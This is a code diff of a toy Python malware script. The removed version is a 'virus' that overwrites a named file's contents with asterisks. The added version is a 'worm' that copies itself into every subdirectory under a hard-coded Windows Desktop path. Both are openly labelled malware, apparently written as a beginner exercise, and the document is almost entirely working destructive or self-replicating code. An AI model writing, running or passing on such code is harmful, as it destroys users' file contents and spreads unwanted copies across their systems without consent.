@@ -1,13 +1,23 @@
-# Write a viruswhich accepts a file name and changes every character to an asterisk
-# zzzzz (too easy)
+# Simple worm which duplicates this file into the directories mentioned and all of its sub-directories, and so on
 
-def virus(filename):
+import os
+import shutil
+
+def worm(current_file, directory):
   try:
-    with open(filename, 'r') as file: data = file.read()
-    newdata = '*' * len(data)
-    with open(filename, 'w') as file: file.write(newdata)
-    print("Virus executed")
+    for parent, directories, files in os.walk(directory):
+      destination = os.path.join(parent, os.path.basename(current_file))
+      shutil.copy(current_file, destination)
+      print(f"Worm replicated to: {destination}")
   except: print("Error")
 
-filename = input("Enter filename (with extension): ")
-virus(filename)
+def main():
+  current_file = os.path.basename(__file__)
+  directories = [
+    "C:\\Users\\sample\\Desktop",
+  ]
+  for directory in directories:
+    if os.path.isdir(directory):
+      worm(current_file, directory)
+
+if __name__ == "__main__": main()
